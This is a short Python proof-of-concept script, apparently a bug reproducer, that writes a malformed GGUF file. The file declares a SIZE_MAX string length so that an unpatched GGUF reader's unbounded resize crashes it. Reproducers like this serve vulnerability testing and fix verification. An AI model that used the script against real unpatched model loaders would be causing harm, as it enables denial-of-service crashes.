#!/usr/bin/env python3
"""Craft a GGUF whose first KV-value-string has length = SIZE_MAX.

Pre-fix `gguf_reader::read(std::string&)`:
    uint64_t size = -1;
    if (!read(size)) return false;
    dst.resize(size);                        // no upper bound!
    return fread(dst.data(), 1, dst.length(), file) == dst.length();

ASAN flags the absurd dst.resize() as allocation-size-too-big.

GGUF binary layout exercised:
    "GGUF" + version + n_tensors=0 + n_kv=1
    KV: key="x" (uint64 len + 1 byte)
        value_type = GGUF_TYPE_STRING (8)
        value_size = SIZE_MAX (uint64)
        (no body bytes — fread returns short, but resize() already aborted)
"""

import struct
import sys

GGUF_TYPE_STRING = 8
SIZE_MAX = (1 << 64) - 1


def craft(filename: str) -> None:
    with open(filename, "wb") as f:
        f.write(b"GGUF")
        f.write(struct.pack("<I", 3))         # version
        f.write(struct.pack("<Q", 0))         # n_tensors
        f.write(struct.pack("<Q", 1))         # n_kv

        # KV
        key = b"x"
        f.write(struct.pack("<Q", len(key)))
        f.write(key)
        f.write(struct.pack("<I", GGUF_TYPE_STRING))
        f.write(struct.pack("<Q", SIZE_MAX))  # absurd string length


if __name__ == "__main__":
    out = sys.argv[1] if len(sys.argv) > 1 else "string_exhaustion.gguf"
    craft(out)
    print(f"wrote {out}")
